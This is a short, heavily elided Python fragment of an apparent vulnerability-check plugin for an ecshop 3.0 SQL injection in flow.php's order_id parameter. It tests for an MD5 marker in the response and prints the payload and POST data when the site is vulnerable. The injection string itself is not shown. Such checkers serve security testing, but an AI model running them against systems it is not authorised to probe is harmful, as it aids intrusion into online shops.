...
class ecshop_flow_orderid_sqli:
    ...
    def run(self):
        ...
        try:
            ...
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                printGreen("[+]Success:存在ecshop3.0 flow.php 参数order_id注入漏洞...(高危)\tpayload: "+vulnurl+ "\npost: "+json.dumps(post_data, indent=4))
            else:
                printBlue("[-]Info:不存在ecshop_flow_orderid_sqli漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = ecshop_flow_orderid_sqli(sys.argv[1])
    testVuln.run()
